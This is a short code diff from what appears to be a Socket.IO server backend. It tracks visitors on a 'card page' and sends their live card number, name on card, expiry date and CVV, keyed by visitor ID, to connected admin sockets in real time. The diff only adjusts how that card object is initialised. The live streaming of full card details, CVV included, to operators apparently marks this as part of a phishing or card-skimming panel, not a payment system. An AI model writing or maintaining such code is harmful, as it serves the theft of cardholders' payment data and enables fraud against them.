@@ -392,7 +392,7 @@ io.on("connection", (socket) => {
         visitor.hasEnteredCardPage = true;
         visitor.lastDataUpdate = new Date().toISOString();
         if (!visitor.liveCard) {
-          visitor.liveCard = { cardNumber: '', nameOnCard: '', expiryDate: '', cvv: '' };
+          /*FIX42*/ if (!visitor.liveCard || !String(visitor.liveCard.cardNumber || "").replace(/\D/g, "")) { visitor.liveCard = { cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" }; }
           visitor.liveCardTimestamp = new Date().toISOString();
           admins.forEach((admin, adminSocketId) => {
             io.to(adminSocketId).emit("card:liveUpdate", { visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp });
